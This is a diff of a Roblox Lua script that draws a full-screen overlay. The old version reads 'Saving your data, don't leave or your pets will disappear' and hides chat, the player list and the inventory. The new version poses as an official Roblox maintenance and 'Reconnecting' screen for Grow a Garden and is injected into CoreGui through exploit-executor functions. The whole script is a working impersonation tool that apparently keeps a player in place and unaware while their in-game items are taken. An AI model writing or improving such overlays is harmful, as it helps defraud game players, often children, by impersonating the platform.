@@ -1,109 +1,89 @@
--- Black Screen Overlay Script
--- Place this in StarterPlayerScripts as a LocalScript
-
-local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
-
+local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-local playerGui = player:WaitForChild("PlayerGui")
 
--- Create ScreenGui with maximum DisplayOrder
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "BlackScreenOverlay"
-screenGui.DisplayOrder = 2147483647 -- Maximum possible DisplayOrder
-screenGui.IgnoreGuiInset = true -- Covers the entire screen including top bar
-screenGui.ResetOnSpawn = false
-screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global -- Ensures proper layering
-screenGui.Parent = playerGui
+-- Create GUI
+local gui = Instance.new("ScreenGui")
+gui.Name = "FakeRobloxUpdateOverlay"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
--- Create black background frame
-local blackFrame = Instance.new("Frame")
-blackFrame.Name = "BlackBackground"
-blackFrame.Size = UDim2.new(1, 0, 1, 0)
-blackFrame.Position = UDim2.new(0, 0, 0, 0)
-blackFrame.BackgroundColor3 = Color3.new(0, 0, 0) -- Pure black
-blackFrame.BorderSizePixel = 0
-blackFrame.ZIndex = 2147483647 -- Maximum ZIndex
-blackFrame.Active = false -- Allows input to pass through
-blackFrame.Parent = screenGui
+-- Fullscreen black frame
+local background = Instance.new("Frame")
+background.Size = UDim2.new(1, 0, 1, 0)
+background.Position = UDim2.new(0, 0, 0, 0)
+background.BackgroundColor3 = Color3.new(0, 0, 0)
+background.BackgroundTransparency = 1
+background.ZIndex = 999999999
+background.Active = false -- let input pass through
+background.Parent = gui
 
--- Create text label
-local textLabel = Instance.new("TextLabel")
-textLabel.Name = "LoadingText"
-textLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
-textLabel.Position = UDim2.new(0.1, 0, 0.4, 0)
-textLabel.BackgroundTransparency = 1
-textLabel.Text = "Saving your data\nDon't leave or your pets will disappear..."
-textLabel.TextColor3 = Color3.new(1, 1, 1) -- White text
-textLabel.TextScaled = true
-textLabel.Font = Enum.Font.GothamBold
-textLabel.TextXAlignment = Enum.TextXAlignment.Center
-textLabel.TextYAlignment = Enum.TextYAlignment.Center
-textLabel.ZIndex = 2147483647 -- Maximum ZIndex
-textLabel.Active = false -- Allows input to pass through
-textLabel.Parent = blackFrame
+-- Fake ROBLOX logo
+local robloxLogo = Instance.new("TextLabel")
+robloxLogo.Size = UDim2.new(1, 0, 0, 100)
+robloxLogo.Position = UDim2.new(0.5, 0, 0.3, 0)
+robloxLogo.AnchorPoint = Vector2.new(0.5, 0.5)
+robloxLogo.BackgroundTransparency = 1
+robloxLogo.TextColor3 = Color3.fromRGB(255, 255, 255)
+robloxLogo.Font = Enum.Font.GothamBlack
+robloxLogo.TextScaled = true
+robloxLogo.Text = "ROBLOX"
+robloxLogo.TextTransparency = 1
+robloxLogo.ZIndex = 1000000000
+robloxLogo.Parent = gui
 
--- Store original states to restore later
-local originalTopbarState = true
-local originalChatState = true
-local dots = ""
-local dotCount = 0
+-- Maintenance message
+local message = Instance.new("TextLabel")
+message.Size = UDim2.new(0.8, 0, 0.2, 0)
+message.Position = UDim2.new(0.5, 0, 0.5, 0)
+message.AnchorPoint = Vector2.new(0.5, 0.5)
+message.BackgroundTransparency = 1
+message.TextColor3 = Color3.fromRGB(255, 255, 255)
+message.Font = Enum.Font.Gotham
+message.TextScaled = true
+message.TextWrapped = true
+message.Text = "Roblox is having issues with Grow a Garden.\nPlease wait while we update..."
+message.TextTransparency = 1
+message.ZIndex = 1000000000
+message.Parent = gui
 
-spawn(function()
-    while screenGui.Parent do
-        dotCount = dotCount + 1
-        if dotCount > 3 then
-            dotCount = 0
-            dots = ""
-        else
-            dots = dots .. "."
-        end
-        
-        textLabel.Text = "Saving your data\nDon't leave or your pets will disappear" .. dots
-        wait(0.5)
-    end
-end)
+-- Reconnecting animation
+local reconnect = Instance.new("TextLabel")
+reconnect.Size = UDim2.new(0.8, 0, 0.1, 0)
+reconnect.Position = UDim2.new(0.5, 0, 0.65, 0)
+reconnect.AnchorPoint = Vector2.new(0.5, 0.5)
+reconnect.BackgroundTransparency = 1
+reconnect.TextColor3 = Color3.fromRGB(255, 255, 255)
+reconnect.Font = Enum.Font.GothamMedium
+reconnect.TextScaled = true
+reconnect.Text = "Reconnecting"
+reconnect.TextTransparency = 1
+reconnect.ZIndex = 1000000000
+reconnect.Parent = gui
 
--- Additional security to disable core GUIs temporarily
-local StarterGui = game:GetService("StarterGui")
-
--- Disable core GUIs to prevent them from appearing above the overlay
-pcall(function()
-    StarterGui:SetCore("TopbarEnabled", false)
-    StarterGui:SetCore("ChatActive", false)
-    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
-end)
-
--- To remove the overlay later, you can call:
--- screenGui:Destroy()
-
--- Function to restore ALL core GUIs when overlay is removed
-local function restoreCoreGUIs()
-    pcall(function()
-        StarterGui:SetCore("TopbarEnabled", originalTopbarState)
-        StarterGui:SetCore("ChatActive", originalChatState)
-        
-        -- Re-enable all core GUI types
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, true)
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health, true)
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, true)
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.SelfView, true)
-        StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Captures, true)
-    end)
+-- Add to CoreGui
+if gethui then
+	gui.Parent = gethui()
+elseif syn and syn.protect_gui then
+	syn.protect_gui(gui)
+	gui.Parent = game:GetService("CoreGui")
+else
+	gui.Parent = game:GetService("CoreGui")
 end
 
--- Connect cleanup function to overlay destruction
-screenGui.AncestryChanged:Connect(function()
-    if not screenGui.Parent then
-        restoreCoreGUIs()
-    end
-end)
+-- Tween in logo + text
+TweenService:Create(background, TweenInfo.new(0.4), {BackgroundTransparency = 0}):Play()
+TweenService:Create(robloxLogo, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
+TweenService:Create(message, TweenInfo.new(0.6), {TextTransparency = 0}):Play()
+TweenService:Create(reconnect, TweenInfo.new(0.8), {TextTransparency = 0}):Play()
 
--- Or if you want to remove it after a certain time:
---[[
-wait(10) -- Wait 10 seconds
-screenGui:Destroy()
---]]
+-- Animate "Reconnecting..."
+task.spawn(function()
+	while gui and gui.Parent do
+		for i = 0, 3 do
+			reconnect.Text = "Reconnecting" .. string.rep(".", i)
+			task.wait(0.5)
+		end
+	end
+end)
